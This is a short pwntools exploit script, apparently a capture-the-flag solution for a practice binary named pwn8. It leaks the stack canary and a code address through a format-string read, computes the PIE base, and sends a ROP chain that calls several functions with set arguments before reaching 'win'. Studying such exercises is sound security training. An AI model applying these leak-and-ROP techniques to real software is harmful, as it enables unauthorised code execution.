from pwn import *


binary = "./pwn8"

e = ELF(binary)

r = process(binary)

r.recv()

r.sendline("%3$lx : %19$lx")
leak = r.recv().decode().split(" : ")
canary = int(leak[1], 16)
leaked_vuln_addr = int(leak[0], 16) - 16
print(hex(canary), hex(leaked_vuln_addr))
e.address = leaked_vuln_addr - e.symbols['vuln']
er = ROP(binary)
#pop_rdi_gadget = e.address + er.find_gadget(["pop rdi"])[0]
pop_gadget = e.address + 0x00001022
ret_gadget = e.address + er.find_gadget(["ret"])[0]

#payload = flat("A" * 24, p32(canary),"B"*12, p32(e.symbols['func1']),p32(e.symbols['func2']),p32(0x1337),p32(0xCAFEF00D),p32(e.symbols['func3']))
payload = flat(
    "A" * 24,
    p32(canary),
    "B" * 12,
    p32(e.symbols['func1']),
    p32(pop_gadget),
    p32(0x1337),
    p32(e.symbols['func2']),
    p32(pop_gadget),
    p32(0xCAFEF00D),
    p32(e.symbols['func3']),
    p32(pop_gadget),
    p32(0xD00DF00D),
    p32(e.symbols['win'])
    
)
gdb.attach(r,"""
b *vuln +100
b *vuln +118
c""")
r.sendline(payload)
r.interactive()
